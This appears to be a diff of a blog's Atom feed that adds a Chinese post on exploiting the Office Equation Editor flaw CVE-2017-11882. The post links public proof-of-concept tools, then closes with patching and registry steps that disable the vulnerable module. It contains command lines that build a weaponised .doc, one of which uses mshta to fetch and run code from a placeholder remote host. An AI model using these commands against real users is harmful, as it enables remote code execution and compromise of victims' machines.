@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.chabug.org/"/>
-  <updated>2017-11-21T08:05:44.430Z</updated>
+  <updated>2017-11-23T06:11:21.809Z</updated>
   <id>http://www.chabug.org/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>对于CVE-2017-11882的利用</title>
+    <link href="http://www.chabug.org/2017/11/23/CVE-2017-11882/"/>
+    <id>http://www.chabug.org/2017/11/23/CVE-2017-11882/</id>
+    <published>2017-11-23T06:01:09.000Z</published>
+    <updated>2017-11-23T06:11:21.809Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:<a href="http://www.freebuf.com/vuls/154462.html" target="_blank" rel="external">隐藏17年的Office远程代码执行漏洞POC样本分析（CVE-2017-11882)</a>。</p><p>今天在twitter上看到有人共享了一个POC，<a href="https://twitter.com/gossithedog/status/932694287480913920" target="_blank" rel="external">twitter地址</a>，<a href="http://owned.lab6.com/~gossi/research/public/cve-2017-11882/" target="_blank" rel="external">Poc地址</a>，后来又看到有人共享了一个项目<a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="external">CVE-2017-11882</a>，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式来执行远程文件的，使用起来可能并不容易。<br>然后在GitHub上又找到了一个，<a href="https://github.com/Ridter/CVE-2017-11882/" target="_blank" rel="external">项目地址</a>。<br>使用方式很简单，如果要执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python Command_CVE<span class="number">-2017</span><span class="number">-11882.</span>py -c <span class="string">"cmd.exe /c calc.exe"</span> -o test.doc</div></pre></td></tr></table></figure><p>demo<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flrziofcqgg30w40hznpd.gif" alt=""></p><p>进一步利用，由于有长度的限制，这里可以采用mshta的方式来执行。构造的命令如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python Command_CVE<span class="number">-2017</span><span class="number">-11882.</span>py -c <span class="string">"mshta http://site.com/abc"</span> -o test.doc</div></pre></td></tr></table></figure></p><p>最终效果如下：<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flrzkkb094g30w40hzwtb.gif" alt=""><br>解决方案：</p><p>1、微软已经对此漏洞做出了修复。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">下载https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882  更新补丁进行修补</div><div class="line">开启Windows Update功能，定期对系统进行自动更新</div></pre></td></tr></table></figure></p><p>由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。</p><p>按下Win+R组合键，打开cmd.exe</p><p>对应office版本修改以下注册表路径以后，输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;&quot; /v &quot;Compatibility Flags&quot; /t REG_DWORD /d 0x400</div><div class="line"></div><div class="line">reg add &quot;HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;&quot; /v &quot;Compatibility Flags&quot; /t REG_DWORD /d 0x400</div><div class="line">office</div></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:&lt;a href=&quot;http://www.freebuf.com/vuls/154462.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;隐藏17年的Office远程代码执行漏
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>贼好看之Xshell5的配色方案monokai</title>
